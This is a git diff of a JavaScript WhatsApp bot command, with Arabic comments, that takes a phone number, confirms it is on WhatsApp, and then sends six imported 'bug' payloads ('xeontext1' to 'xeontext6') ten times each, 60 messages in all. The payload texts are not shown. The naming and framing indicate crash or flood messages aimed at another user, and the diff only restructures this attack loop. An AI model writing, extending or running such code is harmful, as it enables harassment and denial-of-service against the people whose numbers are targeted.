@@ -1,4 +1,9 @@
-const path = require('path');
+const { xeontext1 } = require('./bugvip1');
+const { xeontext2 } = require('./bugvip2');
+const { xeontext3 } = require('./bugvip3');
+const { xeontext4 } = require('./bugvip4');
+const { xeontext5 } = require('./bugvip5');
+const { xeontext6 } = require('./bugvip6');
 
 module.exports = async ({ sock, msg, text, reply }) => {
   if (!text.startsWith("bug")) return;
@@ -13,34 +18,25 @@ module.exports = async ({ sock, msg, text, reply }) => {
   const jid = `${number}@s.whatsapp.net`;
 
   try {
-    // ✅ تحقق من أن الرقم موجود على واتساب
-    const exists = await sock.onWhatsApp(jid);
-    if (!exists || !exists[0]?.exists) {
-      return reply("❌ الرقم غير موجود على واتساب.");
-    }
-
     await reply(`⏳ جاري إرسال BUG إلى: ${number}\nيرجى الانتظار...`);
 
-    // ✅ أسماء الملفات التي تحتوي النصوص
-    const bugFiles = [
-      'bugvip1.js',
-      'bugvip2.js',
-      'bugvip3.js',
-      'bugvip4.js',
-      'bugvip5.js',
-      'bugvip6.js'
-    ];
+    // ✅ تحقق من وجود الرقم في واتساب
+    const exists = await sock.onWhatsApp(jid);
+    if (!exists || exists.length === 0 || !exists[0].exists) {
+      return reply(`❌ الرقم ${number} غير موجود على واتساب.`);
+    }
 
-    for (const file of bugFiles) {
-      const { xeontext6 } = require(path.join(__dirname, file));
+    // ✅ الرسائل من الملفات
+    const bugs = [xeontext1, xeontext2, xeontext3, xeontext4, xeontext5, xeontext6];
+
+    for (const bug of bugs) {
       for (let i = 0; i < 10; i++) {
-        await sock.sendMessage(jid, { text: xeontext6 });
-        await new Promise(resolve => setTimeout(resolve, 1500)); // تأخير 1.5 ثانية
+        await sock.sendMessage(jid, { text: bug });
+        await new Promise(resolve => setTimeout(resolve, 1500)); // انتظار 1.5 ثانية
       }
     }
 
-    await reply(`✅ تم إرسال جميع الرسائل إلى: ${number}`);
-
+    await reply(`✅ تم إرسال جميع الرسائل (${bugs.length * 10}) إلى: ${number}`);
   } catch (err) {
     console.error(err);
     await reply(`❌ فشل في إرسال الرسالة إلى: ${number}`);
